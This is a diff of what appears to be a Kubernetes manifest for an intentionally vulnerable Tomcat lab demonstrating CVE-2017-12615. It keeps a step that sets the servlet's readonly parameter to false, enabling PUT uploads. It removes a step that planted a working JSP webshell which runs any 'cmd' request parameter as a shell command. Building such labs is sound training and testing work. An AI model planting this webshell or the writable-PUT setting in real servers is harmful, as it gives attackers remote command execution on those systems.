@@ -27,12 +27,6 @@ spec:
               cd /usr/local/tomcat/conf
               LINE=$(nl -ba web.xml | grep '<load-on-startup>1' | awk '{print $1}')
               sed -i "$LINE i <init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>" web.xml
-              # 운영 환경 설계: 이전 침투 흔적으로 shell.jsp 가 webapps/ROOT 에 잔존
-              # (CVE-2017-12615 취약점 시연 — 공격자가 PUT 실패해도 기존 webshell 로 RCE).
-              # Java 8 완전 호환 (BufferedReader + readLine loop). admin:admin env/KG 광고판과 결합.
-              cat > /usr/local/tomcat/webapps/ROOT/shell.jsp <<'JSPEOF'
-              <%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd"); if(cmd!=null){ Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd}); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); } %>
-              JSPEOF
               cd /usr/local/tomcat && exec bin/catalina.sh run
           ports:
             - { containerPort: 8080 }   # HTTP — PUT 웹셸(CVE-2017-12615)
